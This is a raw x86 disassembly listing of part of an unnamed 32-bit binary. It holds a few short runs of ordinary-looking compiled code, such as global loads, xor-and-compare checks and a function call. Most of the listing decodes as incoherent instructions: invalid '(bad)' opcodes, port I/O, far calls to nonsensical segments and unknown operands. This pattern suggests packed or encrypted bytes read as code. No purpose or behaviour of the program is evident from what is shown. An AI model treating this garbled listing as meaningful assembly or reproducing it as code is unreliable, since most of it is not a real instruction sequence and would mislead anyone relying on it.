  4119ac:	jae    0x411a24
  4119ae:	fdiv   QWORD PTR [edx-0xe236dcd]
  4119b4:	adc    DWORD PTR [edi-0x3baa7465],edx
  4119ba:	xor    ecx,0xf3a
  4119c0:	or     ecx,eax
  4119c2:	mov    eax,ds:0x422538
  4119c7:	mov    eax,DWORD PTR [eax+0x1d8]
  4119cd:	mov    eax,DWORD PTR [eax]
  4119cf:	xor    esi,0x6665
  4119d5:	or     esi,edx
  4119d7:	add    ecx,0xef6a96a5
  4119dd:	cdq    
  4119de:	adc    esi,0xc8b6a000
  4119e4:	cmp    eax,ecx
  4119e6:	jne    0x4119f4
  4119ec:	cmp    edx,esi
  4119ee:	je     0x411f3d
  4119f4:	mov    eax,DWORD PTR [ebp-0x50]
  4119f7:	jmp    0x411c6c
  4119fc:	loope  0x4119a1
  4119fe:	lods   eax,DWORD PTR ds:[esi]
  4119ff:	aam    0xab
  411a01:	mov    edx,0xd9d49ae0
  411a06:	gs mov esp,0x7cb96c1c
  411a0c:	imul   BYTE PTR [esi+0x18]
  411a0f:	sbb    BYTE PTR [ecx+0x14],dh
  411a12:	sbb    BYTE PTR [eax],bl
  411a14:	outs   dx,DWORD PTR ds:[esi]
  411a15:	mov    cs,WORD PTR [esi+0x953f5e0]
  411a1b:	repnz repnz (bad) ds:0xed19af63
  411a23:	aad    0x0
  411a25:	out    dx,eax
  411a26:	scas   al,BYTE PTR es:[edi]
  411a27:	loop   0x4119ce
  411a29:	icebp  
  411a2a:	int3   
  411a2b:	les    esp,FWORD PTR [esi+0x1bc28f73]
  411a31:	adc    eax,DWORD PTR [edx-0x319aed74]
  411a37:	pop    edi
  411a38:	xchg   edx,eax
  411a39:	retf   0x427e
  411a3c:	iret   
  411a3d:	pop    edi
  411a3e:	jp     0x4119e2
  411a40:	cmp    DWORD PTR [esi-0x78bc6540],ebx
  411a46:	mov    ebp,0x98fc5945
  411a4b:	inc    eax
  411a4c:	lods   al,BYTE PTR ds:[esi]
  411a4d:	or     eax,DWORD PTR ss:[ebx]
  411a50:	ret    0x2d6c
  411a53:	loop   0x411ac3
  411a55:	sbb    BYTE PTR ds:0x48859723,0x7e
  411a5c:	add    ebx,edx
  411a5e:	mov    edx,0xa3db72ac
  411a63:	cmp    BYTE PTR [eax+0x21],bh
  411a66:	and    eax,0xe0ace90
  411a6b:	ror    dl,cl
  411a6d:	das    
  411a6e:	in     eax,0x1c
  411a70:	sar    BYTE PTR fs:[ebx+0x24ee3bbb],cl
  411a77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a78:	fisubr WORD PTR [edi-0x6ff1da39]
  411a7e:	cmp    ch,bh
  411a80:	in     al,0x6d
  411a82:	(bad)  
  411a84:	out    0xf5,eax
  411a86:	out    0x33,eax
  411a88:	adc    ah,BYTE PTR [eax+0x3e561718]
  411a8e:	lahf   
  411a8f:	adc    BYTE PTR [esi-0x6d],ah
  411a92:	and    eax,0xca7cb4c2
  411a97:	sar    DWORD PTR [edi+0x3],1
  411a9a:	and    BYTE PTR [esi],bh
  411a9c:	pop    es
  411a9d:	je     0x411afa
  411a9f:	adc    eax,0xa5a537e5
  411aa4:	into   
  411aa5:	adc    al,0x14
  411aa7:	or     al,0x4a
  411aa9:	pop    esi
  411aaa:	jle    0x411b28
  411aac:	gs (bad) 
  411aae:	ds pop esp
  411ab0:	shr    ecx,0x96
  411ab3:	fwait
  411ab4:	push   0x73
  411ab6:	or     eax,esp
  411ab8:	push   ecx
  411ab9:	lds    edi,FWORD PTR [edx+0x691618ee]
  411abf:	jg     0x411a98
  411ac1:	dec    esp
  411ac2:	lds    ecx,FWORD PTR ss:[edx+0x61]
  411ac6:	or     al,dh
  411ac8:	xchg   BYTE PTR [ebp-0x4c],al
  411acb:	push   ss
  411acc:	aas    
  411acd:	inc    edx
  411ace:	sbb    DWORD PTR [edx+0x5ea84952],esp
  411ad4:	push   edx
  411ad5:	mov    eax,0x80613d72
  411ada:	cmp    eax,0x80ffac3
  411adf:	aaa    
  411ae0:	test   DWORD PTR [esp+edx*1-0x27],ecx
  411ae4:	jb     0x411a8d
  411ae6:	jne    0x411ad7
  411ae8:	cmc    
  411ae9:	icebp  
  411aea:	shl    BYTE PTR [ebx+0x46],1
  411aed:	std    
  411aee:	test   DWORD PTR [ecx],0x598613fa
  411af4:	nop
  411af5:	cmp    al,0xdd
  411af7:	mov    bh,0xa3
  411af9:	pop    esp
  411afa:	sbb    edx,esi
  411afc:	sbb    BYTE PTR [esi-0x27],cl
  411aff:	out    dx,al
  411b00:	and    eax,0x60e00e
  411b05:	dec    esi
  411b06:	out    0x4c,eax
  411b08:	hlt    
  411b09:	and    eax,0xe142de06
  411b0e:	sti    
  411b0f:	mov    ebp,0x721dbaf6
  411b14:	cmp    al,0xc1
  411b16:	cli    
  411b17:	shl    BYTE PTR [ebp+edi*8-0x1c],1
  411b1b:	cwde   
  411b1c:	mov    edi,edi
  411b1e:	cdq    
  411b1f:	pop    ebp
  411b20:	clc    
  411b21:	cmp    BYTE PTR [si-0x60],bh
  411b25:	dec    DWORD PTR [esi+0x27]
  411b28:	retf   0xa57d
  411b2b:	add    DWORD PTR [eax],eax
  411b2d:	int    0xa3
  411b2f:	inc    ecx
  411b30:	cmp    esi,esp
  411b32:	js     0x411b4e
  411b34:	pause  
  411b36:	add    bl,dh
  411b38:	lahf   
  411b39:	rcr    edi,0xad
  411b3c:	xor    al,0x42
  411b3e:	jns    0x411af1
  411b40:	retf   0x616f
  411b43:	push   ecx
  411b44:	aas    
  411b45:	dec    bp
  411b47:	mov    ebx,edi
  411b49:	call   0x3b89293a
  411b4e:	rol    DWORD PTR [edx-0x3c],1
  411b51:	ficomp DWORD PTR [ebx-0x70]
  411b54:	mov    ds:0xf04ed9f5,al
  411b59:	fnstcw WORD PTR [ebp-0x48]
  411b5c:	mov    eax,0xd8576d98
  411b61:	sbb    DWORD PTR ds:0x2d49036f,0x9166f57
  411b6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b6c:	in     al,dx
  411b6d:	jecxz  0x411b87
  411b6f:	pop    ds
  411b70:	ret    
  411b71:	scas   al,BYTE PTR es:[edi]
  411b72:	cld    
  411b73:	aad    0x25
  411b75:	jge    0x411bb8
  411b77:	cmp    al,0x8d
  411b79:	adc    eax,0xcde45015
  411b7e:	inc    esp
  411b7f:	sbb    al,0xe
  411b81:	and    DWORD PTR [edx],0x960e11de
  411b87:	arpl   ax,bx
  411b89:	mov    dh,0xdc
  411b8b:	das    
  411b8c:	adc    bl,bh
  411b8e:	inc    ebp
  411b8f:	adc    edi,DWORD PTR [ecx]
  411b91:	leave  
  411b92:	pop    esp
  411b93:	cmp    eax,0x239cba02
  411b98:	sahf   
  411b99:	xlat   BYTE PTR ds:[ebx]
  411b9a:	mov    BYTE PTR [edi+0x13],0x5c
  411b9e:	js     0x411c12
  411ba0:	xlat   BYTE PTR ds:[ebx]
  411ba1:	popf   
  411ba2:	push   edx
  411ba3:	cdq    
  411ba4:	fld    DWORD PTR [eax+ebx*1-0x79e7dfa2]
  411bab:	int    0x86
  411bad:	add    BYTE PTR [esi],0x1b
  411bb0:	lods   al,BYTE PTR ds:[esi]
  411bb1:	jle    0x411c22
  411bb3:	dec    ecx
  411bb4:	sbb    eax,0xa1a6d6c8
  411bb9:	cmp    al,0xa8
  411bbb:	dec    eax
  411bbc:	scas   al,BYTE PTR es:[edi]
  411bbd:	leave  
  411bbe:	sahf   
  411bbf:	in     al,dx
  411bc0:	push   0xba486ed7
  411bc5:	jp     0x411b61
  411bc7:	mov    bl,0xed
  411bc9:	ss push ss
  411bcb:	sahf   
  411bcc:	ror    BYTE PTR [edi+0x3172a82d],0xc3
  411bd3:	lods   al,BYTE PTR ds:[esi]
  411bd4:	shr    BYTE PTR [esp+edx*2+0x28bbfef0],cl
  411bdb:	dec    ebx
  411bdc:	inc    edi
  411bdd:	cmp    edx,DWORD PTR [edx]
  411bdf:	cdq    
  411be0:	mov    fs,WORD PTR [eax]
  411be2:	fs inc eax
  411be4:	mov    eax,ds:0x4fbc34a4
  411be9:	retf   0x29af
  411bec:	test   eax,0x87c53555
  411bf1:	cmp    eax,0x631632dd
  411bf6:	xor    al,0x65
  411bf8:	xor    esp,edi
  411bfa:	pop    es
  411bfb:	fstp   DWORD PTR [esi-0x3a]
  411bfe:	xlat   BYTE PTR ds:[ebx]
  411bff:	and    DWORD PTR [ebp-0x68],edx
  411c02:	mov    DWORD PTR [ebx],edi
  411c04:	inc    esp
  411c05:	fcmovbe st,st(6)
  411c07:	shr    BYTE PTR [edx-0x75],0x79
  411c0b:	aas    
  411c0c:	mov    es,WORD PTR [ecx-0x59]
  411c0f:	dec    esi
  411c10:	ds shl ebp,1
  411c13:	mov    eax,ds:0x4f95a833
  411c18:	ret    
  411c19:	pop    edx
  411c1a:	pop    ss
  411c1b:	das    
  411c1c:	in     al,0x6e
  411c1e:	ret    
  411c1f:	pop    edx
  411c20:	jle    0x411c58
  411c22:	fadd   QWORD PTR [eax-0x79]
  411c25:	push   ss
  411c26:	enter  0x4120,0xfd
  411c2a:	xchg   esi,eax
  411c2b:	xor    BYTE PTR [eax-0x1407cb32],bl
  411c31:	adc    al,BYTE PTR ds:0xc619a3f5
  411c37:	fld1   
  411c39:	mov    ebx,0x2146fc9b
  411c3e:	rcl    BYTE PTR [esi+esi*4+0x26e6a8e5],1
  411c45:	aas    
  411c46:	xlat   BYTE PTR ds:[ebx]
  411c47:	mov    dh,BYTE PTR [ebx]
  411c49:	call   0x21b077e5
  411c4e:	cmc    
  411c4f:	sub    BYTE PTR [edx+edx*8+0x3c053fff],ch
  411c56:	outs   dx,DWORD PTR ds:[esi]
  411c57:	push   ebx
  411c58:	xor    ebp,DWORD PTR [edx-0x1618f4e6]
  411c5e:	sti    
  411c5f:	and    al,0x1c
  411c61:	out    dx,al
  411c62:	out    0x1f,eax
  411c64:	enter  0x2050,0x95
  411c68:	stos   DWORD PTR es:[edi],eax
  411c69:	cwde   
  411c6a:	fcomp  DWORD PTR [ebx+ecx*4+0x558bb44d]
  411c71:	mov    al,ds:0x5a4758b
  411c76:	sbb    BYTE PTR [eax+0x0],bh
  411c79:	add    BYTE PTR [ecx+0x87d1],al
  411c7f:	add    BYTE PTR [ebx],cl
  411c81:	ret    0x558b
  411c84:	nop
  411c85:	jmp    0x411efa
  411c8a:	pop    ebp
  411c8b:	and    DWORD PTR [esi],esi
  411c8d:	xor    bh,BYTE PTR ds:[esi]
  411c90:	pop    ebp
  411c91:	sbb    bh,BYTE PTR [edi+edi*8-0xec095f8]
  411c98:	cmp    DWORD PTR [edi+ecx*2+0x6a],0x18
  411c9d:	sbb    BYTE PTR [ecx+0x14],dh
  411ca0:	sbb    BYTE PTR [eax],bl
  411ca2:	out    0x7a,eax
  411ca4:	leave  
  411ca5:	fidiv  WORD PTR [eax+0x66]
  411ca8:	out    dx,eax
  411ca9:	gs push ebx
  411cab:	pop    ebp
  411cac:	mov    bl,dh
  411cae:	ins    BYTE PTR es:[edi],dx
  411caf:	push   ebx
  411cb0:	and    cl,ah
  411cb2:	or     BYTE PTR [eax+0x149e8836],bl
  411cb8:	sti    
  411cb9:	inc    ebx
  411cba:	out    0xa6,al
  411cbc:	out    dx,eax
  411cbd:	retf   0x1dfb
  411cc0:	leave  
  411cc1:	data16 (bad) 
  411cc4:	stc    
  411cc5:	push   0x633afabe
  411cca:	mov    eax,0xdf9c4d66
  411ccf:	cwde   
  411cd0:	pushf  
  411cd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cd2:	rol    DWORD PTR [edx-0x52],cl
  411cd5:	sub    al,0xea
  411cd7:	sbb    eax,0x3bbc2775
  411cdc:	jmp    0x411cfb
  411cde:	xor    eax,0xd3947157
  411ce3:	jmp    0x411d49
  411ce5:	sub    BYTE PTR [edx],ah
  411ce7:	jno    0x411d10
  411ce9:	int    0x23
  411ceb:	xchg   ecx,eax
  411cec:	pop    edi
  411ced:	mov    edi,eax
  411cef:	loop   0x411cfa
  411cf1:	(bad)  
  411cf2:	fild   WORD PTR [ebp+0x70]
  411cf5:	adc    al,0xa6
  411cf7:	add    ecx,edi
  411cf9:	sub    eax,0xd4f35d9e
  411cfe:	int    0x5
  411d00:	cmp    eax,0x91addd08
  411d05:	sbb    esp,DWORD PTR [ebx]
  411d07:	or     eax,0x6de7bc5f
  411d0c:	aad    0x26
  411d0e:	mov    eax,0xc0a89ff6
  411d13:	mov    edx,0x4a042cd9
  411d18:	mov    eax,0xfe64049f
  411d1d:	call   0x4b44:0x9de8f9b7
  411d24:	sub    al,0xca
  411d26:	test   BYTE PTR [edi],dh
  411d28:	loope  0x411cf2
  411d2a:	ret    
  411d2b:	fist   WORD PTR [edx+0x6a]
  411d2e:	mov    ch,0x26
  411d30:	push   esi
  411d31:	call   0x29d4:0x5bd28c16
  411d38:	stos   DWORD PTR es:[edi],eax
  411d39:	jmp    0x411d3e
  411d3b:	inc    ecx
  411d3c:	cmp    dh,BYTE PTR [edi+edx*8]
  411d3f:	cmp    BYTE PTR [ebx-0x150667b3],al
  411d45:	stos   DWORD PTR es:[edi],eax
  411d46:	loope  0x411d67
  411d48:	xor    BYTE PTR [eax-0x4e252a4e],bl
  411d4e:	mov    esp,0x2e40c1ae
  411d53:	sub    al,0xee
  411d55:	inc    esi
  411d56:	cwde   
  411d57:	int3   
  411d58:	in     al,0x5c
  411d5a:	(bad)  
  411d5b:	cmc    
  411d5c:	mov    eax,ds:0x45292499
  411d61:	(bad)  
  411d62:	lock (bad) 
  411d64:	out    0x67,eax
  411d66:	jns    0x411d20
  411d68:	not    DWORD PTR [ecx-0x47a831bc]
  411d6e:	mov    gs,WORD PTR [eax+0x7c1f2706]
  411d74:	add    bl,cl
  411d76:	in     al,0x32
  411d78:	and    DWORD PTR [esi+ecx*4+0x75f7f336],eax
  411d7f:	adc    al,ah
  411d81:	sbb    al,0x58
  411d83:	sti    
  411d84:	daa    
  411d85:	mov    ds:0x6a808ef3,eax
  411d8a:	inc    edi
  411d8b:	cmp    dl,al
  411d8d:	xor    eax,0x688ee56a
  411d92:	inc    edx
  411d93:	push   0x2438b4e6
  411d98:	ss push es
  411d9a:	jnp    0x411d3f
  411d9c:	pop    ebx
  411d9d:	ficom  DWORD PTR [eax]
  411d9f:	or     BYTE PTR [edx],al
  411da1:	xor    ah,BYTE PTR [eax+0x13]
  411da4:	fild   DWORD PTR [esi+0x3d466da3]
  411daa:	aaa    
  411dab:	mov    cl,0x4b
  411dad:	loop   0x411e22
  411daf:	sub    eax,ebp
  411db1:	repnz pop esp
  411db3:	or     dl,al
  411db5:	add    DWORD PTR [ecx],edi
  411db7:	pushf  
  411db8:	sahf   
  411db9:	fnsave gs:[ebp+0x196c26e6]
  411dc0:	jp     0x411d84
  411dc2:	out    dx,al
  411dc3:	sub    bl,dl
  411dc5:	jne    0x411d48
  411dc7:	cmp    edi,DWORD PTR [edx-0x31]
  411dca:	push   edi
  411dcb:	sbb    dh,BYTE PTR [ebx+eiz*2+0x13]
  411dcf:	and    dl,BYTE PTR [edx]
  411dd1:	icebp  
  411dd2:	push   cs
  411dd3:	pop    edx
  411dd4:	arpl   WORD PTR [ebp+edx*1+0x6b],dx
  411dd8:	push   ds
  411dd9:	das    
  411dda:	(bad)  [ebp+0x5f]
  411ddd:	jecxz  0x411dd9
  411ddf:	loop   0x411ded
  411de1:	mov    cs,WORD PTR [ecx-0x2f]
  411de4:	xchg   esi,eax
  411de5:	adc    eax,eax
  411de7:	and    BYTE PTR [eax],dh
  411de9:	bound  ebp,QWORD PTR [ebx+0x50da08ad]
  411def:	sahf   
  411df0:	mov    eax,ds:0x6956439c
  411df5:	idiv   DWORD PTR [esi+0x40]
  411df8:	pushw  0xffdc
  411dfb:	les    esi,FWORD PTR [ebx]
  411dfd:	and    al,0x8d
  411dff:	int    0x66
  411e01:	jae    0x411d83
  411e03:	xlat   BYTE PTR ds:[ebx]
  411e04:	sub    edx,0x60
  411e07:	mov    ebp,0x9da00a49
  411e0c:	pop    eax
  411e0d:	call   0xe5cb:0xb470205a
  411e14:	int3   
  411e15:	mov    cl,0xcc
  411e17:	adc    eax,0x22d7e1cb
  411e1c:	ficomp WORD PTR [esi+0xc997ef1]
  411e22:	lods   al,BYTE PTR ds:[esi]
  411e23:	xlat   BYTE PTR ds:[ebx]
  411e24:	push   ebp
  411e25:	ret    
  411e26:	jmp    0x411ea7
  411e28:	mov    DWORD PTR [esi],0xf4d2366b
  411e2e:	je     0x411dc7
  411e30:	mov    al,0x79
  411e32:	adc    eax,0xcf622a2e
  411e37:	fdivr  DWORD PTR [ecx-0x427fafe0]
  411e3d:	scas   al,BYTE PTR es:[edi]
  411e3e:	xchg   DWORD PTR [ebp-0x2dc7995],esp
  411e44:	loopne 0x411ea6
  411e46:	ins    BYTE PTR es:[edi],dx
  411e47:	inc    eax
  411e48:	xchg   ebx,eax
  411e49:	call   0x33df:0xaaec90eb
  411e50:	(bad)  
  411e51:	(bad)  
  411e53:	loop   0x411e76
  411e55:	jo     0x411ed1
  411e57:	rcl    BYTE PTR [edi-0x34],0x99
  411e5b:	sub    BYTE PTR [ebp+edx*2-0x7c5ce534],0x4c
  411e63:	add    BYTE PTR [eax+0x41],dl
  411e66:	dec    esi
  411e67:	out    dx,eax
  411e68:	add    ebx,ebx
  411e6a:	and    al,al
  411e6c:	push   ss
  411e6d:	adc    eax,0x944f82a4
  411e72:	(bad)  
  411e73:	cmp    dh,BYTE PTR [edi*1+0x4b0d828c]
  411e7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e7b:	retf   0x6263
  411e7e:	cmp    ch,BYTE PTR [edx]
  411e80:	stc    
  411e81:	xor    al,0x12
  411e83:	xchg   ebp,eax
  411e84:	xor    dl,bh
  411e86:	and    al,0x4b
  411e88:	adc    dh,bl
  411e8a:	mov    ecx,DWORD PTR [edi+esi*1-0x6d]
  411e8e:	cdq    
  411e8f:	jl     0x411e38
  411e91:	adc    bh,BYTE PTR [esi-0x37a24130]
  411e97:	inc    BYTE PTR [ebx]
  411e99:	mov    ds:0x53ba8275,eax
  411e9e:	pop    ds
  411e9f:	out    dx,al
  411ea0:	jle    0x411eea
  411ea2:	adc    ebp,ecx
  411ea4:	xor    BYTE PTR [ecx],bh
  411ea6:	xchg   ecx,eax
  411ea7:	int    0x8c
  411ea9:	mov    ds:0x5a56f9a7,eax
  411eae:	mov    ch,0xb1
  411eb0:	aaa    
  411eb1:	loope  0x411e4d
  411eb3:	enter  0x63cd,0xfc
  411eb7:	aam    0xdb
  411eb9:	pushf  
  411eba:	call   0xf2cda363
  411ebf:	jns    0x411e4e
  411ec1:	mov    WORD PTR [ebp-0x73],?
  411ec4:	lahf   
  411ec5:	stos   BYTE PTR es:[edi],al
  411ec6:	push   esi
  411ec7:	jne    0x411e6e
  411ec9:	frstor [edx-0x77]
  411ecc:	pop    ecx
  411ecd:	popf   
  411ece:	add    DWORD PTR [ebx],ecx
  411ed0:	inc    esi
  411ed1:	cdq    
  411ed2:	push   0x28820545
  411ed7:	pop    ecx
  411ed8:	adc    al,0x18
  411eda:	mov    gs,WORD PTR [ebp-0x159232e0]
  411ee0:	fwait
  411ee1:	jecxz  0x411f1c
  411ee3:	loop   0x411ee1
  411ee5:	jmp    0xb3e1e209
  411eea:	mov    al,0x36
  411eec:	push   es
  411eed:	mov    ah,0xd4
  411eef:	leave  
  411ef0:	push   ebp
  411ef1:	jl     0x411f72
  411ef3:	xlat   BYTE PTR ds:[ebx]
  411ef4:	sub    BYTE PTR [ecx+0x744ffac3],bl
  411efa:	or     ecx,esi
  411efc:	mov    esi,DWORD PTR [ebp-0x6c]
  411eff:	push   esi
  411f00:	push   edx
  411f01:	push   ecx
  411f02:	push   eax
  411f03:	call   0x416c20
  411f08:	mov    ecx,DWORD PTR [ebp-0x80]
  411f0b:	mov    esi,DWORD PTR [ebp-0x7c]
  411f0e:	and    eax,ecx
  411f10:	mov    ecx,DWORD PTR ds:0x422538
  411f16:	mov    ecx,DWORD PTR [ecx+0x1d0]
  411f1c:	mov    ecx,DWORD PTR [ecx]
  411f1e:	and    edx,esi
  411f20:	xor    eax,0x2b01
  411f25:	xor    edx,0x2021
  411f2b:	xor    esi,esi
  411f2d:	cmp    ecx,eax
  411f2f:	jne    0x4127da
  411f35:	cmp    esi,edx
  411f37:	jne    0x4127da
  411f3d:	mov    eax,DWORD PTR [ebp-0xa4]
  411f43:	mov    ecx,DWORD PTR [ebp-0xc]
  411f46:	add    eax,0x80ca
  411f4b:	or     eax,ecx
  411f4d:	mov    ecx,DWORD PTR ds:0x4225d4
  411f53:	or     eax,0x686
  411f58:	xor    eax,0x3eec
  411f5d:	lea    eax,[eax+ecx*1-0xc11b]
  411f64:	xor    DWORD PTR ds:0x4225cc,eax
  411f6a:	mov    eax,DWORD PTR [ebp-0x64]
  411f6d:	and    eax,0x4dff
  411f72:	add    eax,DWORD PTR [ebp-0x14]
  411f75:	mov    ecx,DWORD PTR [ebp-0x94]
  411f7b:	xor    eax,0x676c
  411f80:	xor    edx,edx
  411f82:	div    ecx
  411f84:	mov    ecx,DWORD PTR [ebp-0x24]
  411f87:	mov    edx,DWORD PTR [ebp-0x74]
  411f8a:	xor    ecx,0x6e1e
  411f90:	imul   ecx,edx
  411f93:	mov    edx,DWORD PTR [ebp+0x8]
  411f96:	push   0x4
  411f98:	jmp    0x41220d
  411f9d:	mov    gs,WORD PTR [esp+ecx*4-0x7c]
  411fa1:	push   0x64
  411fa3:	jle    0x411fff
  411fa5:	inc    ebp
  411fa6:	inc    ecx
  411fa7:	jne    0x412025
  411fa9:	mov    ah,0x14
  411fab:	pop    edi
  411fac:	jo     0x411f54
  411fae:	data16 sbb BYTE PTR [eax],bl
  411fb1:	jno    0x411fc7
  411fb3:	sbb    BYTE PTR [eax],bl
  411fb5:	dec    edi
  411fb6:	icebp  
  411fb7:	xor    eax,0xdc8eeb2e
  411fbc:	inc    ecx
  411fbd:	nop
  411fbe:	fsubr  QWORD PTR [esi-0x31b6e8cf]
  411fc4:	or     BYTE PTR [ecx],ah
  411fc6:	imul   edi,esp,0xfcbc390d
  411fcc:	dec    ecx
  411fcd:	retf   0xf1dd
  411fd0:	pop    esi
  411fd1:	cmp    BYTE PTR [eax],cl
  411fd3:	jge    0x411f71
  411fd5:	jne    0x41201c
  411fd7:	inc    eax
  411fd8:	add    BYTE PTR [ecx],ch
  411fda:	scas   al,BYTE PTR es:[edi]
  411fdb:	push   ebx
  411fdc:	aam    0x7d
  411fde:	mov    ch,0xa1
  411fe0:	pop    ebx
  411fe1:	popf   
  411fe2:	and    eax,0x6fc0be66
  411fe7:	cmp    eax,0x3d069b70
  411fec:	mov    bh,0xb1
  411fee:	pusha  
  411fef:	dec    edx
  411ff0:	cmp    al,0xd4
  411ff2:	mov    edi,0xd1d3fe3f
  411ff7:	mov    dl,0x6d
  411ff9:	jecxz  0x411f89
  411ffb:	in     eax,0x89
  411ffd:	int3   
  411ffe:	shl    BYTE PTR [esi-0x76395cd1],cl
  412004:	cmp    al,0x9a
  412006:	or     al,BYTE PTR [eax+ebp*1+0x39]
  41200a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41200b:	pop    es
  41200c:	in     al,dx
  41200d:	mov    al,BYTE PTR [eax]
  41200f:	das    
  412010:	pop    eax
  412011:	add    BYTE PTR [eax+0x5],dl
  412014:	ds lahf 
  412016:	std    
  412017:	fistp  WORD PTR [edx]
  412019:	mov    DWORD PTR [esi],0xfe0a4b3
  41201f:	popa   
  412020:	push   esi
  412021:	pop    esp
  412022:	cmp    eax,0xefcab7b8
  412027:	mov    al,0xa
  412029:	mov    edx,0xf28f64ed
  41202e:	jge    0x4120a1
  412030:	aad    0xd3
  412032:	cdq    
  412033:	je     0x4120ac
  412035:	loopne 0x4120b2
  412037:	jbe    0x41201d
  412039:	pmuludq mm5,mm5
  41203c:	sar    BYTE PTR [edx],cl
  41203e:	call   0x5ba563d4
  412043:	bound  ecx,QWORD PTR [esi+ebp*8-0x43]
  412047:	enter  0xaf8c,0x36
  41204b:	jmp    0x4120b6
  41204d:	pop    edi
  41204e:	int3   
  41204f:	xor    eax,0xa2b8409
  412054:	lods   eax,DWORD PTR ds:[esi]
  412055:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412056:	mov    ds,WORD PTR [ebx]
  412058:	stos   BYTE PTR es:[edi],al
  412059:	lds    esp,FWORD PTR [ecx+0xa]
  41205c:	into   
  41205d:	mov    ebx,ebp
  41205f:	xor    ebp,edi
  412061:	add    al,0x2a
  412063:	adc    ch,BYTE PTR [edi+edx*8-0x38]
  412067:	mov    DWORD PTR [ebx+0x33ae0bed],ecx
  41206d:	and    eax,0xd36ec911
  412072:	bound  edx,QWORD PTR [ecx+0x5c]
  412075:	in     eax,dx
  412076:	ficomp DWORD PTR [eax+0x45]
  412079:	enter  0x890b,0x14
  41207d:	stos   BYTE PTR es:[edi],al
  41207e:	push   es
  41207f:	add    DWORD PTR [ebx-0x1a],0x9eee69b2
  412086:	scas   al,BYTE PTR es:[edi]
  412087:	dec    edi
  412088:	pop    es
  412089:	cld    
  41208a:	loop   0x41200e
  41208c:	scas   al,BYTE PTR es:[edi]
  41208d:	xor    eax,0xa29afec7
  412092:	jg     0x4120b1
  412094:	cmp    BYTE PTR [edx-0x2ea25fbd],ch
  41209a:	adc    eax,0x22267fe
  41209f:	and    al,0x47
  4120a1:	sbb    ecx,ebx
  4120a3:	inc    ebp
  4120a4:	cmp    dl,dl
  4120a6:	mov    cl,0x7c
  4120a8:	or     eax,ebx
  4120aa:	adc    ebp,DWORD PTR [ecx+0x68]
  4120ad:	jmp    0xdffe:0xbb476919
  4120b4:	push   ecx
  4120b5:	mov    ecx,0x47bfcf81
  4120ba:	not    DWORD PTR [eax+0x7b27ae79]
  4120c0:	cmp    eax,0x4b61b903
  4120c5:	xchg   DWORD PTR [esi+0x4f],esp
  4120c8:	fadd   DWORD PTR [ecx-0x7c]
  4120cb:	shl    DWORD PTR [ebp-0x47e95c95],cl
  4120d1:	mov    ?,WORD PTR [ebx]
  4120d3:	out    dx,al
  4120d4:	sahf   
  4120d5:	mov    eax,ds:0x26638818
  4120da:	popa   
  4120db:	push   es
  4120dc:	jo     0x412127
  4120de:	jle    0x4120d1
  4120e0:	cmp    esi,DWORD PTR [edx]
  4120e2:	outs   dx,BYTE PTR ds:[esi]
  4120e3:	xor    al,ah
  4120e5:	ins    DWORD PTR es:[edi],dx
  4120e6:	mov    ebx,0x1d566160
  4120eb:	or     BYTE PTR [eax],dh
  4120ed:	gs inc esp
  4120ef:	fiadd  DWORD PTR [eax-0x7a3bf432]
  4120f5:	push   DWORD PTR [edi+edx*1]
  4120f8:	test   DWORD PTR [ecx-0xac68f44],ecx
  4120fe:	(bad)  
  4120ff:	lea    ecx,[ebx+0x3854f7af]
  412105:	add    edx,eax
  412107:	aaa    
  412108:	test   eax,0x4a01b6f5
  41210d:	mov    ecx,0xf62818e6
  412112:	and    al,0x6e
  412114:	pop    ds
  412115:	or     BYTE PTR [edx],0x8d
  412118:	fstp   QWORD PTR [ebp+0x39]
  41211b:	mov    cl,bl
  41211d:	jl     0x4120ac
  41211f:	adc    BYTE PTR [edx+0x28f07f6d],dl
  412125:	xchg   esi,eax
  412126:	dec    esp
  412127:	sti    
  412128:	mov    al,ds:0xd8e9e87d
  41212d:	data16 xchg BYTE PTR [edi],bh
  412130:	add    eax,0x240b3aca
  412135:	scas   eax,DWORD PTR es:[edi]
  412136:	or     eax,0xba88d952
  41213b:	hlt    
  41213c:	rcr    BYTE PTR [esp+eiz*2],1
  41213f:	ss jp  0x412110
  412142:	lea    esi,[ebx-0xc]
  412145:	call   0x1bc5a810
  41214a:	out    0x1b,al
  41214c:	jle    0x412132
  41214e:	pushf  
  41214f:	xor    eax,0x65546e95
  412154:	in     eax,dx
  412155:	mov    esi,0x413c7d0e
  41215a:	jb     0x4121d6
  41215c:	loopne 0x412102
  41215e:	push   0x5f
  412160:	sbb    DWORD PTR [edi],0x4ba97c46
  412166:	jl     0x4121a3
  412168:	(bad)  
  41216a:	push   ecx
  41216b:	adc    edi,DWORD PTR [ebx+0x46]
  41216e:	mov    DWORD PTR [edi],edx
  412170:	es jae 0x4121e2
  412173:	fisttp WORD PTR [edi]
  412175:	add    eax,0x3a3e5a95
  41217a:	push   ecx
  41217b:	push   es
  41217c:	pop    ds
  41217d:	add    eax,0x818d8a86
  412182:	push   edx
  412183:	push   0x37
  412185:	and    bh,dh
  412187:	(bad)  
  412188:	ror    BYTE PTR [esi+0x5e],1
  41218b:	sbb    bh,BYTE PTR [esi-0x9c3fb3c]
  412191:	add    DWORD PTR [edx+edi*1+0x610f9a2b],ecx
  412198:	fiadd  DWORD PTR [edi-0xa]
  41219b:	mov    bh,0xf7
  41219d:	and    ebx,esi
  41219f:	jmp    0x4121d4
  4121a1:	push   0x4af1e8b4
  4121a6:	jg     0x4121ec
  4121a8:	mov    esp,0xfb9931f2
  4121ad:	fcmovne st,st(2)
  4121af:	aad    0x44
  4121b1:	inc    esi
  4121b2:	fild   QWORD PTR ds:0x710a1a6e
  4121b8:	in     al,0x1d
  4121ba:	enter  0x1db7,0xcb
  4121be:	mov    BYTE PTR [esi],0x10
  4121c1:	inc    edi
  4121c2:	sbb    DWORD PTR [edi+0x21],ebx
  4121c5:	push   edi
  4121c6:	cs jns 0x412242
  4121c9:	mov    dh,0xa1
  4121cb:	jg     0x412239
  4121cd:	xchg   ebx,eax
  4121ce:	or     al,0xe4
  4121d0:	or     BYTE PTR [esi+0x3],dl
  4121d3:	adc    eax,0xb3c78a60
